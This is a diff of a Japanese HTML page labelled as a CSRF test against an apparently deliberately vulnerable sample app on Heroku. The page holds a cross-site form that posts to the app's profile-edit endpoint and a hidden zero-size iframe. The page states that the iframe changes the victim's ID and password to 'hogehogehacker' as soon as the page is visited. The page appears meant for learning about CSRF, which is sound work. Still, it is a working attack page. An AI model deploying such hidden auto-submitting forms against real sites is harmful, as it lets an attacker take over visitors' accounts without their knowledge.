@@ -12,11 +12,11 @@
 </head>
 <body>
 	<h1>CSRFテスト（このページはテストページです）</h1>
-
+	<p>アクセスした時点でターゲットページのIDとPWが変更されます</p>
 	<h2>ターゲット</h2>
 	<li><a href="https://hack-csrf-sample.herokuapp.com/" target="_blank">https://hack-csrf-sample.herokuapp.com/</a></li>
 
-	<h2>外部へのフォーム</h2>
+	<h2>（手動版）外部へのフォーム</h2>
 	<form action="https://hack-csrf-sample.herokuapp.com/mypage/edit" method="POST">
 		<p>
 			<label for="userId">ユーザーID</label>
@@ -30,7 +30,7 @@
 	</form>
 
 
-	<h2>自動でId: hogehogehacker, PW: hogehogehacker に変更するiFrame</h2>
+	<h2>（自動実行版）自動でId: hogehogehacker, PW: hogehogehacker に変更するiFrame</h2>
 	<iframe src="hack-iframe.html" name="sample" width="0" height="0"></iframe>
 </body>
 </html>
